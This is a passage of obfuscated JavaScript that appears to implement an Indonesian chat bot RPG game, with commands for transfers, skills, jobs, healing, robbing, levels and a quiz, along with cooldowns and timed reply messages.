_0x476bfb(_0x240d04(0x1a4f)+_0x240d04(0x28f)+_0x1ec495+(_0x240d04(0x8fa)+_0x240d04(0x28f2)+_0x240d04(0x156e)+_0x240d04(0xa73)+_0x240d04(0x1544)+':\x0a')+_0x1e92e6);}if(!_0x1ce978[_0x240d04(0x181)](_0x155155,_0x5da94e)||_0x1ce978[_0x240d04(0x2211)](_0x5da94e,0x0))return _0x476bfb(_0x1ce978[_0x240d04(0xf16)]);let _0x2f236d=_0x483c03[0x2];if(!_0x2f236d)return _0x476bfb(_0x1ce978[_0x240d04(0x349)]);if(!_0x1ce978[_0x240d04(0x28f4)](_0x2f236d,_0x15a4c6))return _0x1ce978[_0x240d04(0x297c)](_0x476bfb,_0x240d04(0x2515)+'*'+_0x2f236d+(_0x240d04(0x202b)+_0x240d04(0x27bd)+_0x240d04(0x197b)+_0x240d04(0x57c)));if(!_0x2f236d)return _0x1ce978['RYJZl'](_0x476bfb,_0x1ce978[_0x240d04(0xf48)]);const _0x2a35d1=_0x15a4c6[_0x2f236d]=_0x15a4c6[_0x2f236d]||{};if(_0x1ce978['jesHe'](_0x54f7a9[_0x37d0cf]||0x0,_0x5da94e))return _0x1ce978['FjSTo'](_0x476bfb,_0x240d04(0x2233)+_0x37d0cf+(_0x240d04(0x658)+_0x240d04(0x2310)));const _0x2b8ba8=_0x54f7a9[_0x37d0cf],_0x52bfb1=_0x2a35d1[_0x37d0cf]||0x0;_0x54f7a9[_0x37d0cf]-=_0x5da94e,_0x2a35d1[_0x37d0cf]=_0x1ce978[_0x240d04(0x2546)](_0x2a35d1[_0x37d0cf]||0x0,_0x5da94e);const _0x515495=_0x1ce978['qXxFt'](_0x2b8ba8,_0x54f7a9[_0x37d0cf])&&_0x1ce978[_0x240d04(0xb42)](_0x2a35d1[_0x2f236d],_0x52bfb1),_0x3fe775=_0x515495?_0x1ce978[_0x240d04(0x26c0)]:_0x1ce978['SPDLo'];await _0x961430(_0x15a4c6),_0x1ce978[_0x240d04(0x2134)](_0x476bfb,_0x240d04(0x1bcc)+'NSFER\x20』–––'+_0x240d04(0x14ef)+_0x240d04(0x68e)+_0x246ab0[_0x240d04(0x1fc7)](_0x37d0cf)+'\x20'+_0x37d0cf+_0x1ce978[_0x240d04(0x2e7e)](_0x268309,_0x37d0cf)+(_0x240d04(0x22cf)+_0x240d04(0x68e))+_0x5da94e+(_0x240d04(0x5b4)+'D\x20')+_0x2f236d+(_0x240d04(0x59b)+_0x240d04(0x68e))+_0x3fe775);}break;case _0x1ce978[_0x240d04(0x1c9)]:{if(_0x1ce978[_0x240d04(0x542)](_0x240d04(0xb2b),'ytkSu')){const _0xfd31af=await _0x1ce978[_0x240d04(0x12cc)](_0x182219),_0x2abb7e=_0xfd31af[_0xb65b97]=_0xfd31af[_0xb65b97]||{};if(!_0x2abb7e||!_0x2abb7e['nama']||!_0x2abb7e[_0x240d04(0x634)])return _0x1ce978['igBjf'](_0x240d04(0x291d),_0x1ce978[_0x240d04(0x2afb)])?_0x1ce978[_0x240d04(0x18fa)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]):_0x1ce978[_0x240d04(0x2a18)](_0x1b5e32,_0x240d04(0x1053)+_0x240d04(0x1536)+_0x364784(_0x1048a6)+(_0x240d04(0x1c1d)+_0x240d04(0x166b)+'lagi.'));const _0xefc49f=[_0x1ce978['DKixB'],_0x240d04(0xaac)+'r',_0x1ce978['SFOAX'],_0x1ce978[_0x240d04(0x5a7)],_0x1ce978['yhkwK'],_0x1ce978['usTub'],_0x1ce978[_0x240d04(0x101)]],_0x4a1612={'satu':'⭐','dua':'⭐⭐','tiga':_0x240d04(0x297d),'empat':_0x1ce978[_0x240d04(0x14ba)],'lima':_0x1ce978[_0x240d04(0x2903)],'enam':_0x240d04(0x2d5a)},_0x4e7fae=_0x1ce978[_0x240d04(0x279a)](_0x33cfb1,'')[_0x240d04(0x2d6d)]()[_0x240d04(0x25f7)+'e']();if(!_0x4e7fae||!_0xefc49f[_0x240d04(0x55c)](_0x4e7fae)){if(_0x1ce978[_0x240d04(0x15f3)](_0x1ce978[_0x240d04(0xabb)],'MCJYK'))return _0x1ce978[_0x240d04(0x1899)](_0x476bfb,_0x240d04(0x111a)+_0x240d04(0xc65)+_0x240d04(0x2b30)+_0x240d04(0xb24)+_0xefc49f[_0x240d04(0x16e6)](_0x35dda4=>'›\x20'+_0x35dda4)[_0x240d04(0x86e)]('\x0a')+(_0x240d04(0x24f3)+'ai:\x0a')+_0x1ec495+('selectskil'+_0x240d04(0x2031)+_0x240d04(0x23bf)+'oh:\x0a')+_0x1ec495+(_0x240d04(0x197e)+'l\x20necroman'+_0x240d04(0x29ef)));else{const _0x4fc863={'pisang':'🍌','anggur':'🍇','mangga':'🥭','jeruk':'🍊','apel':'🍎','bibitpisang':_0x240d04(0x23a4),'bibitanggur':_0x1ce978[_0x240d04(0x1cd)],'bibitmangga':_0x1ce978[_0x240d04(0x2192)],'bibitjeruk':_0x1ce978[_0x240d04(0x37c)],'bibitapel':_0x1ce978['ZvfpB']};return _0x4fc863[_0x2b2696]||'';}}return!_0x2abb7e[_0x240d04(0x207f)]||_0x1ce978[_0x240d04(0x23ee)](_0x2abb7e['skill'],'')?_0x1ce978[_0x240d04(0x118)](_0x1ce978[_0x240d04(0x2817)],_0x1ce978[_0x240d04(0x2817)])?_0x5ddb65(_0x3f2eac['message']):(_0x2abb7e[_0x240d04(0x207f)]=_0x4e7fae,await _0x1ce978[_0x240d04(0x1de6)](_0x961430,_0xfd31af),_0x1ce978['RiFuT'](_0x476bfb,_0x240d04(0x163f)+'ah\x20memilih'+'\x20skill\x20*'+_0x4e7fae+(_0x240d04(0xbde)+_0x240d04(0x20de)+_0x240d04(0x1cde)))):_0x1ce978[_0x240d04(0x27b9)](_0x476bfb,_0x240d04(0x23ff)+_0x240d04(0xede)+_0x240d04(0x2cbf)+_0x2abb7e[_0x240d04(0x207f)]+(_0x240d04(0x21a7)+_0x240d04(0x13e0)+_0x240d04(0x149c)));}else{const _0x3e18a0=_0x294f22[_0x240d04(0x16e6)](_0x56e0a2=>_0x57b0d5[_0x240d04(0x1fc7)](_0x56e0a2)+'\x20'+_0x56e0a2)[_0x240d04(0x86e)]('\x0a');return _0x1ce978[_0x240d04(0x1084)](_0x3af12e,_0x240d04(0x1a4f)+'rmat:\x20'+_0x263334+('transfer\x20['+_0x240d04(0x28f2)+_0x240d04(0x156e)+_0x240d04(0xa73)+_0x240d04(0x1544)+':\x0a')+_0x3e18a0);}}break;case _0x1ce978[_0x240d04(0x1c1c)]:{if(_0x1ce978['JnrHj']!==_0x1ce978[_0x240d04(0x14d1)])_0x1b4b08(_0x403f18,_0x5c556a[_0x240d04(0x2b45)],'logo');else{const _0x4f54a6=await _0x1ce978[_0x240d04(0x2d7b)](_0x182219),_0x5a3810=_0x4f54a6[_0xb65b97]=_0x4f54a6[_0xb65b97]||{};if(!_0x5a3810||!_0x5a3810[_0x240d04(0x2eea)]||!_0x5a3810['umur'])return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);const _0x14fb7f={'exp':0x1f4,'money':0x5207},_0xb7662a=0x9a7ec800,_0x1637f2=Date['now']();if(_0x5a3810[_0x240d04(0x2d00)+'y']&&_0x1ce978[_0x240d04(0x1614)](_0x1637f2,_0x5a3810[_0x240d04(0x2d00)+'y'])<_0xb7662a){if(_0x1ce978[_0x240d04(0x99d)](_0x1ce978[_0x240d04(0x10f9)],_0x1ce978[_0x240d04(0x10f9)])){const _0x293b7b=_0x1ce978[_0x240d04(0x12f6)](_0xb7662a,_0x1ce978[_0x240d04(0x1ec3)](_0x1637f2,_0x5a3810['lastmonthl'+'y'])),_0x322c50=Math['floor'](_0x293b7b/_0x1ce978[_0x240d04(0x154d)](_0x1ce978['sOHZS'](0x3e8*0x3c,0x3c),0x18)),_0x4ec68e=Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0xc6e)](_0x1ce978[_0x240d04(0xb8a)](_0x293b7b,0x3e8*0x3c*0x3c),0x18)),_0x7f6fb9=Math[_0x240d04(0xf02)](_0x1ce978['rLyzc'](_0x293b7b/_0x1ce978[_0x240d04(0x2a50)](0x3e8,0x3c),0x3c)),_0x552674=Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x1fd0)](_0x1ce978[_0x240d04(0x1dc0)](_0x293b7b,0x3e8),0x3c));return _0x1ce978[_0x240d04(0x326)](_0x476bfb,'❌\x20Kamu\x20sud'+'ah\x20nyampah'+_0x240d04(0x57e)+_0x240d04(0x1c6e)+_0x322c50+_0x240d04(0x14e8)+_0x4ec68e+_0x240d04(0x2a6c)+_0x7f6fb9+_0x240d04(0x2eca)+_0x552674+(_0x240d04(0xf06)+_0x240d04(0x1dbb)));}else{if(_0x1ce978['zixjl'](_0x26493d[0x0],0x1))throw _0x240d04(0x20c4);if(_0x1ce978['CdRZr'](_0x27c837[0x0],0x63))throw'maksimal\x209'+'9!';let {index:_0x52a984,latin:_0x393759,arabic:_0x2a76f2,translation_id:_0x534f54,translation_en:_0x122a80}=_0x5d22ca[_0x240d04(0x17dd)][_0x240d04(0x2bb6)][_0x240d04(0x3de)](_0x5743f5=>_0x5743f5['index']==_0x2bb37b[0x0]);return _0x1ce978[_0x240d04(0x27ee)](_0x2296fe,_0x240d04(0x16c2)+_0x52a984+'\x0a\x0a'+_0x393759+'\x20\x0a'+_0x2a76f2+'\x0a'+_0x534f54+'\x20\x0a'+_0x122a80+_0x240d04(0x296f));}}let _0x340af9='';for(let _0xa956ad in _0x14fb7f){_0x1ce978[_0x240d04(0x1eb5)](_0x1ce978[_0x240d04(0x27b0)],_0x1ce978[_0x240d04(0x27b0)])?(_0x1ce978['CaogP'](_0x26d1a3,_0x240d04(0xb17)+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x1ce978[_0x240d04(0x15d1)](_0x5b621b,_0x5e6211)+'*'),delete _0x1cff33[_0xf41ec9]):(_0x5a3810[_0xa956ad]=_0x1ce978[_0x240d04(0x45f)](_0x5a3810[_0xa956ad]||0x0,_0x14fb7f[_0xa956ad]),_0x340af9+='*+'+_0x14fb7f[_0xa956ad]+'*\x20'+_0x246ab0[_0x240d04(0x1fc7)](_0xa956ad)+'\x20'+_0xa956ad+'\x0a');}_0x5a3810[_0x240d04(0x2d00)+'y']=_0x1637f2,await _0x1ce978[_0x240d04(0x195)](_0x961430,_0x4f54a6),_0x476bfb(_0x240d04(0xabe)+'YAMPAH\x20BUL'+_0x240d04(0x805)+_0x240d04(0x1c78)+_0x340af9['trim']());}}break;case _0x1ce978['sANDt']:{if(_0x1ce978[_0x240d04(0x1ef2)](_0x240d04(0x1dda),_0x1ce978['eyEnJ']))_0x2c4de9(_0x1ce978[_0x240d04(0x273c)]);else{const _0x3e28ce=await _0x182219(),_0x5b85d3=_0x3e28ce[_0xb65b97]=_0x3e28ce[_0xb65b97]||{};if(!_0x5b85d3||!_0x5b85d3['nama']||!_0x5b85d3[_0x240d04(0x634)]){if(_0x240d04(0x24f8)===_0x240d04(0x24f8))return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);else{_0x1ce978[_0x240d04(0x206e)](_0x151b63,_0xfc93c4[_0x1e236a]['timeout']);const _0x36ae4c=_0x478d90[_0x352a97]['result'];return delete _0x596dc3[_0x2e235c],_0x58cee3(_0x240d04(0xa64)+_0x240d04(0x971)+_0x240d04(0x1b0f)+'benar:\x20*'+_0x36ae4c+'*');}}const _0x2b53b3=Date['now'](),_0x10640f=0x36ee80,_0x422708=_0x5f5dc7(_0x1ce978[_0x240d04(0x2806)](_0x10640f,_0x1ce978['vWwem'](_0x2b53b3,_0x5b85d3[_0x240d04(0xfe2)]||0x0)));if(_0x1ce978[_0x240d04(0x13ac)](_0x5b85d3[_0x240d04(0x38f)],0x50))return _0x1ce978[_0x240d04(0x2799)](_0x476bfb,_0x240d04(0x2b6d)+_0x240d04(0x2a8c)+_0x240d04(0x2466)+_0x240d04(0x2e67)+_0x240d04(0x110f)+_0x240d04(0x1d0c));if(_0x5b85d3['lastroket']&&_0x2b53b3-_0x5b85d3[_0x240d04(0xfe2)]<_0x10640f)return _0x476bfb(_0x240d04(0x2b6c)+_0x240d04(0x13ae)+_0x422708+('*\x20lagi\x20seb'+_0x240d04(0x2145)+_0x240d04(0x145e)+'.'));const _0x155599=Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x2c7a)](Math[_0x240d04(0x24f1)](),0xa))*0x186a0,_0x1b24e0=Math['floor'](_0x1ce978[_0x240d04(0x620)](Math[_0x240d04(0x24f1)](),0xa))*0x3e8;_0x5b85d3[_0x240d04(0xd24)]=(_0x5b85d3['money']||0x0)+_0x155599,_0x5b85d3[_0x240d04(0x21ac)]=_0x1ce978[_0x240d04(0x265e)](_0x5b85d3[_0x240d04(0x21ac)]||0x0,_0x1b24e0),_0x5b85d3[_0x240d04(0x38f)]-=0x50,_0x5b85d3['rokets']=_0x1ce978[_0x240d04(0xb7c)](_0x5b85d3[_0x240d04(0x2c34)]||0x0,0x1),_0x5b85d3['lastroket']=_0x2b53b3;const _0x4f1f7a=[_0x240d04(0xc86)+(_0x5b85d3['name']||_0x1ce978[_0x240d04(0x26a9)])+(_0x240d04(0xfb)+_0x240d04(0x2871)+_0x240d04(0x384)+_0x240d04(0x1498)),_0x240d04(0x1dae)+'▒▒▒▒▒▒▒▒▒▒'+_0x240d04(0x2c29)+'▄▒▒▒█▒▒▒▒▄'+_0x240d04(0xfd0)+'█▀█▀█▒█▀█▒'+'▒█▀█▒▄███▄'+'▒\x0a░█▀█▀█░█'+'▀██░█▀█░█▄'+'█▄█░\x0a░█▀█▀'+'█░█▀████▀█'+_0x240d04(0x2c70)+_0x240d04(0x2096)+'██████████'+_0x240d04(0xaf0)+_0x240d04(0x1cf2)+_0x240d04(0x12aa),_0x240d04(0x2dcd)+_0x240d04(0xc06)+_0x240d04(0x2a09)+_0x240d04(0x24ea)+'█▀█▒▄███▄▒'+'\x0a░█▀█▀█░█▀'+_0x240d04(0x2961)+'▄█░\x0a░█▀█▀█'+_0x240d04(0x794)+_0x240d04(0xf54)+'█████▀████'+_0x240d04(0x1476)+_0x240d04(0xafc)+_0x240d04(0x924)+'...',_0x240d04(0x5b7)+_0x240d04(0x354)+_0x240d04(0x28a0)+_0x240d04(0x1fd)+_0x240d04(0xd0e)+'▒█▀█▀█▒█▀█'+_0x240d04(0xa9c)+_0x240d04(0x1ea2)+_0x240d04(0x127a)+_0x240d04(0xc7c)+_0x240d04(0x1176)+_0x240d04(0x1938)+_0x240d04(0x31c)+_0x240d04(0x2c12)+'█\x0a\x0a➕\x20Sampa'+'i\x20di\x20tujua'+_0x240d04(0x2580),_0x240d04(0xfdd)+_0x240d04(0x28ee)+_0x240d04(0xe2b),'*—[\x20Hasil\x20'+_0x240d04(0x27b4)+(_0x5b85d3[_0x240d04(0x8f0)]||_0x240d04(0x19c2))+(_0x240d04(0x1e85)+_0x240d04(0x13a3))+_0x155599['toLocaleSt'+_0x240d04(0x1743)]()+_0x240d04(0x18d8)+_0x1b24e0+(_0x240d04(0x1662)+_0x240d04(0x1a5a)+'+1\x0a❤️\x20-80\x20H'+_0x240d04(0x2cf5))];for(let _0xd80aed=0x0;_0xd80aed<_0x4f1f7a['length'];_0xd80aed++){_0x1ce978[_0x240d04(0xf49)](setTimeout,()=>_0x476bfb(_0x4f1f7a[_0xd80aed]),_0x1ce978['rAOSN'](_0xd80aed,0x1388));}await _0x961430(_0x3e28ce);}}break;case'heal':{const _0x3a643e=await _0x1ce978[_0x240d04(0x124)](_0x182219),_0x1033e6=_0x3a643e[_0xb65b97]=_0x3a643e[_0xb65b97]||{};if(!_0x1033e6||!_0x1033e6[_0x240d04(0x2eea)]||!_0x1033e6[_0x240d04(0x634)])return _0x476bfb(_0x1ce978[_0x240d04(0x257a)]);const _0x5723f9=0x1,_0x3120a5=0x14,_0x416208=0x64;if(!_0x483c03[0x0])return _0x1ce978[_0x240d04(0x15c3)](_0x476bfb,_0x240d04(0x1a4f)+_0x240d04(0x111f)+_0x3e6565+(_0x240d04(0x2b7)+_0x240d04(0x1e10))+_0x3e6565+'\x202');const _0xa2a7d6=_0x1ce978[_0x240d04(0x1d7)](parseInt,_0x483c03[0x0]);if(_0x1ce978['kPNaz'](isNaN,_0xa2a7d6)||_0x1ce978[_0x240d04(0xb23)](_0xa2a7d6,0x0))return _0x1ce978['TbUPw'](_0x476bfb,'Jumlah\x20har'+_0x240d04(0x3f7)+_0x240d04(0x500)+_0x240d04(0x2166));if(_0x1ce978['gDbjV'](_0x1033e6[_0x240d04(0xc7e)]||0x0,_0xa2a7d6))return _0x476bfb(_0x240d04(0x9a0)+_0x240d04(0x116c)+_0x240d04(0x1221)+'\x20Potion\x20ka'+_0x240d04(0xfbb)+(_0x1033e6[_0x240d04(0xc7e)]||0x0));const _0x3c4e15=_0x1ce978['ymOEq'](_0xa2a7d6,_0x3120a5),_0x5118f5=_0x1ce978[_0x240d04(0x293c)](_0x416208,_0x1033e6[_0x240d04(0x38f)]||0x64);if(_0x1ce978[_0x240d04(0x2295)](_0x5118f5,0x0))return _0x1ce978['vjSiN'](_0x476bfb,_0x1ce978['QtVVu']);const _0xfc1f30=Math[_0x240d04(0x17cc)](_0x3c4e15,_0x5118f5);_0x1033e6['health']=(_0x1033e6['health']||0x64)+_0xfc1f30,_0x1033e6[_0x240d04(0xc7e)]-=_0xa2a7d6,await _0x1ce978['mwzjv'](_0x961430,_0x3a643e),_0x1ce978['dRJFb'](_0x476bfb,_0x240d04(0x6bf)+_0x240d04(0xed2)+_0x240d04(0x221d)+'\x20sebanyak\x20'+'*+'+_0xfc1f30+(_0x240d04(0x127)+_0x240d04(0x22bc)+'rsisa:\x20*')+_0x1033e6[_0x240d04(0xc7e)]+(_0x240d04(0x153e)+_0x240d04(0x2aee)+'\x20*')+_0x1033e6['health']+'*');}break;case _0x1ce978['eaeVS']:{function _0x4d18ce(_0x2d78da){const _0x53f3d7=_0x240d04;let _0x450e3e=Math[_0x53f3d7(0xf02)](_0x1ce978['zlQxZ'](_0x2d78da,0x36ee80)),_0x458a3e=_0x1ce978[_0x53f3d7(0x7d5)](Math[_0x53f3d7(0xf02)](_0x1ce978[_0x53f3d7(0x6f0)](_0x2d78da,0xea60)),0x3c),_0x445940=_0x1ce978['ioHNu'](Math[_0x53f3d7(0xf02)](_0x1ce978['NgaZC'](_0x2d78da,0x3e8)),0x3c);return[_0x450e3e,_0x458a3e,_0x445940][_0x53f3d7(0x16e6)](_0x2470d8=>_0x2470d8['toString']()[_0x53f3d7(0x1f96)](0x2,0x0))[_0x53f3d7(0x86e)](':');}const _0x4ec183=await _0x1ce978[_0x240d04(0x233f)](_0x182219),_0x251dd0=_0x4ec183[_0xb65b97]=_0x4ec183[_0xb65b97]||{};if(!_0x251dd0||!_0x251dd0['nama']||!_0x251dd0[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x2dde)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);const _0x20fdc2=Date[_0x240d04(0x104e)](),_0xa03640=0x36ee80,_0x44b401=_0x4d18ce(_0xa03640-_0x1ce978[_0x240d04(0xf5c)](_0x20fdc2,_0x251dd0[_0x240d04(0x1b67)]||0x0));if(_0x1ce978[_0x240d04(0x8e3)](_0x251dd0[_0x240d04(0x38f)],0x50))return _0x1ce978['MyGlP'](_0x476bfb,_0x1ce978[_0x240d04(0x23ab)]);if(_0x251dd0[_0x240d04(0x1b67)]&&_0x1ce978[_0x240d04(0x18b2)](_0x1ce978['QRgYH'](_0x20fdc2,_0x251dd0[_0x240d04(0x1b67)]),_0xa03640))return _0x1ce978[_0x240d04(0x2335)](_0x476bfb,_0x240d04(0x20db)+_0x240d04(0x2e45)+'u\x20*'+_0x44b401+(_0x240d04(0x20ef)+_0x240d04(0x2639)+'agi.'));const _0x1e2586=_0x1ce978[_0x240d04(0x18a0)](Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0xf6d)](Math[_0x240d04(0x24f1)](),0xa)),0x186a0),_0x5f159c=_0x1ce978[_0x240d04(0x333)](Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0x12c7)](Math[_0x240d04(0x24f1)](),0xa)),0x3e8);_0x251dd0[_0x240d04(0xd24)]=_0x1ce978[_0x240d04(0x2202)](_0x251dd0[_0x240d04(0xd24)]||0x0,_0x1e2586),_0x251dd0['exp']=(_0x251dd0['exp']||0x0)+_0x5f159c,_0x251dd0['health']-=0x50,_0x251dd0[_0x240d04(0x359)]=(_0x251dd0[_0x240d04(0x359)]||0x0)+0x1,_0x251dd0[_0x240d04(0x1b67)]=_0x20fdc2;const _0x528b0f=[_0x1ce978[_0x240d04(0x7ae)],_0x240d04(0x26ed)+'\x20🚗\x0a\x0a✔️\x20Meng'+_0x240d04(0x1ec5)+_0x240d04(0x173a),_0x1ce978[_0x240d04(0x2885)],_0x240d04(0x28b0)+_0x240d04(0x1784),_0x1ce978['dMkDh'],'*—[\x20Hasil\x20'+_0x240d04(0x451)+_0x240d04(0xbff)+_0x240d04(0x1d7d)+_0x1e2586[_0x240d04(0x17bf)+'ring']()+_0x240d04(0x18d8)+_0x5f159c+(_0x240d04(0x2e8a)+_0x240d04(0x2362)+'tal\x20Rob:\x20')+_0x251dd0['rob']];for(let _0x46b050=0x0;_0x1ce978[_0x240d04(0x13ac)](_0x46b050,_0x528b0f[_0x240d04(0x2b45)]);_0x46b050++){if(_0x1ce978[_0x240d04(0x24d2)](_0x240d04(0xcbe),_0x240d04(0x1563)))return _0x1ce978[_0x240d04(0x27ae)](_0x5ed6fd,_0x1ce978[_0x240d04(0x257a)]);else _0x1ce978[_0x240d04(0x132b)](setTimeout,()=>_0x476bfb(_0x528b0f[_0x46b050]),_0x46b050*0x1388);}await _0x1ce978[_0x240d04(0x2644)](_0x961430,_0x4ec183);}break;case _0x1ce978[_0x240d04(0x289d)]:{const _0x17ada8=await _0x182219(),_0x25d04e=_0x17ada8[_0xb65b97]=_0x17ada8[_0xb65b97]||{};if(!_0x25d04e||!_0x25d04e['nama']||!_0x25d04e[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x281a)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);const _0x3171c9=Date['now'](),_0x1c68b2=0x36ee80,_0x321e53=_0x5f5dc7(_0x1ce978[_0x240d04(0xca5)](_0x1c68b2,_0x1ce978[_0x240d04(0xbaa)](_0x3171c9,_0x25d04e['lastojek']||0x0)));if(_0x1ce978['qcFcf'](_0x25d04e[_0x240d04(0x38f)],0x32))return _0x1ce978[_0x240d04(0x1522)](_0x476bfb,'❤️\x20Kamu\x20but'+_0x240d04(0x2a8c)+'\x2050\x20Health'+_0x240d04(0x1b95)+'jek.');if(_0x25d04e[_0x240d04(0xd43)]&&_0x1ce978['NZzls'](_0x3171c9-_0x25d04e[_0x240d04(0xd43)],_0x1c68b2))return _0x1ce978[_0x240d04(0x13a6)](_0x476bfb,_0x240d04(0x1eeb)+_0x321e53+('*\x20sebelum\x20'+_0x240d04(0x160f)+'i.'));const _0x2d292b=_0x1ce978['XOVIz'](Math['floor'](_0x1ce978[_0x240d04(0xf19)](Math[_0x240d04(0x24f1)](),0xa)),0x186a0),_0x4a6e97=_0x1ce978[_0x240d04(0x912)](Math[_0x240d04(0xf02)](_0x1ce978[_0x240d04(0xc44)](Math[_0x240d04(0x24f1)](),0xa)),0x3e8),_0x95dbe2=_0x25d04e['ojekk']||0x0;_0x25d04e[_0x240d04(0xd24)]=_0x1ce978[_0x240d04(0x1056)](_0x25d04e[_0x240d04(0xd24)]||0x0,_0x2d292b),_0x25d04e['exp']=_0x1ce978[_0x240d04(0x2cf3)](_0x25d04e['exp']||0x0,_0x4a6e97),_0x25d04e[_0x240d04(0x38f)]-=0x32,_0x25d04e[_0x240d04(0x1e6d)]=_0x95dbe2+0x1,_0x25d04e[_0x240d04(0xd43)]=_0x3171c9;const _0x2ffceb=[_0x240d04(0x2e23)+'pelanggan.'+'..',_0x240d04(0x1199)+_0x240d04(0x402)+'kan\x20ordera'+_0x240d04(0x1686),_0x240d04(0x2ce3)+'tar\x20pelang'+_0x240d04(0x2127),'🏘️\x0a🛵\x20➕\x20Samp'+_0x240d04(0x280e)+_0x240d04(0x1169),'🏘️\x0a🛵\x20➕\x20💹Men'+_0x240d04(0x4f1)+_0x240d04(0x29fe),'*—[\x20Hasil\x20'+_0x240d04(0xc19)+_0x240d04(0x14f2)+_0x240d04(0x27a)+_0x2d292b['toLocaleSt'+'ring']()+_0x240d04(0x18d8)+_0x4a6e97+(_0x240d04(0x2b9e)+'\x20selesai:\x20'+_0x240d04(0x175)+_0x240d04(0x941)+_0x240d04(0x2eb4))+_0x95dbe2];for(let _0xcf257c=0x0;_0x1ce978[_0x240d04(0x8e4)](_0xcf257c,_0x2ffceb[_0x240d04(0x2b45)]);_0xcf257c++){if(_0x1ce978[_0x240d04(0x2805)](_0x1ce978[_0x240d04(0x2785)],_0x1ce978[_0x240d04(0x2a7e)]))_0x1ce978[_0x240d04(0xe20)](setTimeout,()=>_0x476bfb(_0x2ffceb[_0xcf257c]),_0x1ce978[_0x240d04(0x232e)](_0xcf257c,0x1388));else return _0x1ce978[_0x240d04(0x21e)](_0x253b06,_0x240d04(0x19fe)+_0x240d04(0x23c6)+_0x240d04(0x1813)+_0x240d04(0x33b)+'\x20nama.umur'+_0x240d04(0x163d)+_0x240d04(0x2d8a));}await _0x1ce978[_0x240d04(0x22a4)](_0x961430,_0x17ada8);}break;case _0x240d04(0x2736):{const _0x3c9801=await _0x1ce978[_0x240d04(0xd99)](_0x182219),_0x2728a2=_0x3c9801[_0xb65b97]=_0x3c9801[_0xb65b97]||{'exp':0x0,'money':0x0,'level':0x0};if(!_0x2728a2||!_0x2728a2[_0x240d04(0x2eea)]||!_0x2728a2[_0x240d04(0x634)]){if(_0x1ce978['iYlNk'](_0x1ce978['PRogj'],_0x1ce978[_0x240d04(0x2717)]))_0x1ce978[_0x240d04(0x27c5)](_0x23f213,'⏱️\x20Waktu\x20ha'+_0x240d04(0x2a04)+_0x240d04(0x26d4)+_0x250e60(_0x41b4aa)+'*'),delete _0x48d2a5[_0x2d84f4];else return _0x1ce978[_0x240d04(0x10f1)](_0x476bfb,_0x240d04(0x19fe)+_0x240d04(0x23c6)+'RPG!\x0aGunak'+_0x240d04(0x33b)+'\x20nama.umur'+_0x240d04(0x163d)+_0x240d04(0x2d8a));}const _0x20a90b=_0x2728a2[_0x240d04(0x21ac)],_0x3da5fe=_0x1ce978[_0x240d04(0x15c)](_0x53c5da,_0x20a90b),_0x15ef0f=_0x1ce978[_0x240d04(0xfac)](_0x99d01b,_0x1ce978['HACBF'](_0x3da5fe,0x1)),_0x183a53=_0x1ce978[_0x240d04(0x22e3)](_0x99d01b,_0x3da5fe),_0x445819=_0x1ce978['xionj'](_0x20a90b,_0x183a53),_0x4bb6d8=_0x1ce978[_0x240d04(0x20d0)](_0x15ef0f,_0x20a90b);_0x1ce978[_0x240d04(0x1d28)](_0x476bfb,_0x1ce978['AwWLx'](_0x1ce978[_0x240d04(0x1372)](_0x1ce978[_0x240d04(0xb79)]('🎖️\x20*Level\x20I'+_0x240d04(0x18f4),'Level:\x20*'+_0x3da5fe+'*\x0a'),'EXP:\x20*'+_0x20a90b+'\x20/\x20'+_0x15ef0f+'*\x0a'),_0x240d04(0x2acf)+_0x240d04(0x8c2)+_0x4bb6d8+_0x240d04(0x1f45)));}break;case _0x240d04(0x1b53)+'ra':{if(activeGame[_0xb65b97])return _0x1ce978[_0x240d04(0x1604)](_0x476bfb,_0x1ce978[_0x240d04(0x24a8)]);try{if(_0x1ce978[_0x240d04(0x2843)]('qFEOX',_0x1ce978['CmeMG'])){const _0x4e4057=await _0x182219(),_0x400a22=_0x4e4057[_0xb65b97]=_0x4e4057[_0xb65b97]||{'exp':0x0,'money':0x0};if(!_0x400a22||!_0x400a22['nama']||!_0x400a22[_0x240d04(0x634)])return _0x1ce978[_0x240d04(0x28e6)](_0x476bfb,_0x1ce978[_0x240d04(0x257a)]);if(_0x400a22[_0x240d04(0x2344)]){if(_0x1ce978[_0x240d04(0x433)]!=='wICwI')return _0x476bfb(_0x1ce978[_0x240d04(0x1453)]);else{const _0x118426={'kqLmx':function(_0x26100e,_0x311ca2){const _0x33536a=_0x240d04;return _0x1ce978[_0x33536a(0x2d07)](_0x26100e,_0x311ca2);}},_0x2505ae=_0x1ce978[_0x240d04(0x29ca)](_0x1ce978[_0x240d04(0x574)](_0x1ce978['NBOpp'],_0x5634b7[_0x240d04(0x1121)](_0x355969)[_0x240d04(0x16e6)](([_0x46a037,_0x51d93d])=>{const _0x45738e=_0x240d04;let _0x36e8d2=_0x1e30ea[_0x45738e(0x1adb)](_0x51d93d)[0x0];return _0x45738e(0x2adb)+_0x39d04f(_0x46a037)+'\x20*'+_0x58d7e6(_0x46a037)+_0x45738e(0x19ce)+_0x51d93d[_0x36e8d2]+'\x20'+_0x118426['kqLmx'](_0x13013b,_0x36e8d2)+'\x20'+_0x118426['kqLmx'](_0x2764ac,_0x36e8d2)+'*';})[_0x240d04(0x86e)]('\x0a')),_0x240d04(0x243)+_0x240d04(0x1e98)+_0x240d04(0x13fe)+_0x240d04(0x57d)+_0x240d04(0x102d)+_0x240d04(0x25df));return _0x1ce978['xXRrR'](_0x586d9f,_0x2505ae);}}const _0x1095bb=await 